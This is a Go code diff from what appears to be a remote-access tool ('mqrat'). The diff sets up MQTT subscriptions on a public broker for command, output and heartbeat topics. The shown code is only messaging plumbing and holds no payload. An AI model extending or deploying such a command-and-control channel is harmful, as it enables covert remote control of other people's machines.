@@ -13,8 +13,16 @@ const brokerHostname string = "broker.hivemq.com:1883"
 
 const baseTopic string = "/mqrat/cmd"
 
+// outputTopic contains the name of subtopic used to receive command responses
+const outputTopic string = "output"
+
+// cmdTopic name of subtopic used to send commands
+const cmdTopic string = "command"
+
+// client is a handle to mqtt client
 var client MQTT.Client
 
+// qosLevel contains the value used for QoS
 var qosLevel byte
 
 func Start(QoS byte) {
@@ -37,7 +45,10 @@ func Start(QoS byte) {
 	waitForToken(token)
 
 	// Make subscriptions
-	token = client.Subscribe(fmt.Sprintf("%v/+", baseTopic), QoS, onMessageReceived)
+	token = client.Subscribe(fmt.Sprintf("%v/+/+", baseTopic), QoS, onMessageReceived)
+	waitForToken(token)
+
+	token = client.Subscribe(fmt.Sprintf("%v/+", baseTopic), QoS, onHeartbeatReceived)
 	waitForToken(token)
 }
 
@@ -52,5 +63,9 @@ func waitForToken(token MQTT.Token) {
 }
 
 func onMessageReceived(client MQTT.Client, message MQTT.Message) {
+	go translateMessage(client, message)
+}
+
+func onHeartbeatReceived(client MQTT.Client, message MQTT.Message) {
 	go translateMessage(client, message)
 }
